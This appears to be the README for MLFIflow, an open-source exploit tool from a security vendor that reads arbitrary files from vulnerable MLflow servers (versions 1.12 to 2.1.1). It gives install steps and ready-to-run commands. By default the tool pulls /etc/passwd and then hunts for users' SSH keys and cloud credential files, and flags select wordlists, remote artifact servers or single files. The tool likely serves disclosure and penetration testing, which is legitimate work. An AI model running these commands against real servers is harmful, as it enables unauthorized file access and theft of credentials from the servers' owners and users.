# MLFIflow

MLFIflow is an exploit tool for reading arbitrary files from MLflow servers version 1.12 - 2.1.1.

## Installation

```bash
git clone https://github.com/protectai/Snaike-MLflow.git
cd Snaike-MLflow/MLFIflow
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

## Usage

By default, MLFIflow will attempt to read /etc/passwd from the MLflow server and use the usernames found to search for
SSH keys and cloud credential files.
```bash
python MLFIflow.py -s http://127.0.0.1:5000
```

To specify a wordlist of files to download, use the -f flag:
```bash
python MLFIflow.py -s http://127.0.0.1:5000 -f /path/to/wordlist.txt
```

Read files from a remote artifact server:
```bash
python MLFIflow.py -s http://127.0.0.1:5000 -f /path/to/wordlist.txt --remote http://1.2.3.4
```

Read a specific file from the MLflow server:
```bash
python MLFIflow.py -s http://127.0.0.1:5000 -t /etc/passwd
```

## Contributing

Pull requests are welcome. For major changes, please open an issue first
to discuss what you would like to change.

## License

Copyright 2023 ProtectAI

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

   http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
